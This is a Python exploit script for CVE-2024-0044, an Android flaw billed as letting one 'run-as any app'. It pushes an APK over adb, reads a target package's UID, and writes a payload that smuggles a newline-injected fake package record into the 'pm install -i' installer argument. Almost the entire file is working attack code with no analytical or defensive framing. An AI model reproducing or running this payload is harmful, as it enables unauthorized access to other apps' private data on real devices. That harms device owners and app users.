import argparse
import subprocess, os
from art import *

class CustomFormatter(argparse.ArgumentDefaultsHelpFormatter, argparse.RawDescriptionHelpFormatter):
    pass

def display_banner():
    print('''                                                                               
.                   .:.                                         .::.                     .
.                 :++++=:                                     :=+++++                    .
.                 -**++++-                                   :++++**+                    .
.                  =**++++=                                 -++++**+                     .
.                   -**++++=.                              =++++**=                      .
.                    :**++++=.    ..::-----------:::.     =++++**=                       .
.                     .**++++=--====---------------====--=++++**-                        .
.                      .*++====-------------------------====++*:                         .
.                     :======-----------------------------======:                        .
.                  .-======------=====================------======-.                     .
.                .=+===============================================+=:                   .
.              .=+++===============================================+++=.                 .
.             -++++=================================================++++-                .
.            =++++++===*#%@@%+++++++++++++++++++++++++++++#@@@#*===+++++++.              .
.          .++++++++++#@%@@@@#+++++++++++++++++++++++++++*@@@@%@%++++++++++.             .
.         .+**++++++++@@@@@@@*+++++++++++++++++++++++++++*@%@@@@@++++++++**+.            .
.         +****+++++++*@@@@#*+++++++++++++++++++++++++++++*#@@@@#+++++++****+            .
.        =******+++++++++++++++++++++++++++++++++++++++++++++++++++++++******=           .
.       .********+++++++++++++++++++++++++++++++++++++++++++++++++++++********:          .
.       =*********+++++++++++++++++++++++++++++++++++++++++++++++++++*********+        
          ''')

parser = argparse.ArgumentParser(
    description='CVE-2024-0044: run-as any app',
    formatter_class=CustomFormatter,
    epilog= display_banner()
)
parser.add_argument("-P", help="package name", required=True)
parser.add_argument("-A", help="apk file path", required=True)
args = parser.parse_args()

package_name = args.P
apk_path = args.A

def push_apk(apk_path):
    try:
        if not os.path.isfile(apk_path):
            print(f"Error: APK file '{apk_path}' does not exist.")
            return False
        
        result = subprocess.run(['adb', 'push', apk_path, '/data/local/tmp/'], capture_output=True, text=True)
        
        if result.returncode != 0:
            print(f"Error: {result.stderr.strip()}")
            return False

        print(f"Successfully pushed '{apk_path}' to /data/local/tmp/")
        return True
    except Exception as e:
        print(f"An error occurred: {e}")
        return False

def get_app_uid(package_name):
    try:
        result = subprocess.run(['adb', 'shell', f'pm list packages -U | grep {package_name}'], capture_output=True, text=True)
        
        if result.returncode != 0:
            print(f"Error: {result.stderr.strip()}")
            return None

        for line in result.stdout.splitlines():
            if f'package:{package_name} uid:' in line:
                uid = line.split('uid:')[1].strip()
                return uid
        return None
    except Exception as e:
        print(f"An error occurred: {e}")
        return None

def generate_payload(uid, apk_filename):
    try:
        payload = f"PAYLOAD=\"@null\nvictim {uid} 1 /data/user/0 default:targetSdkVersion=28 none 0 0 1 @null\"\npm install -i \"$PAYLOAD\" /data/local/tmp/{apk_filename}"
        with open('payload.txt', 'w') as f:
            f.write(payload)
        print(f"Payload generated and saved to 'payload.txt'")
    except Exception as e:
        print(f"An error occurred: {e}")
        
if __name__ == "__main__":
    try:
        if apk_path.endswith('.apk'):
            success = push_apk(apk_path)
            if success:
                apk_filename = os.path.basename(apk_path)
                uid = get_app_uid(package_name)
                if uid:
                    generate_payload(uid, apk_filename)
                else:
                    print(f"Could not find UID for the package {package_name}")
            else:
                print(f"Failed to push the APK '{apk_path}'.")
                
    except argparse.ArgumentError:
        parser.print_help()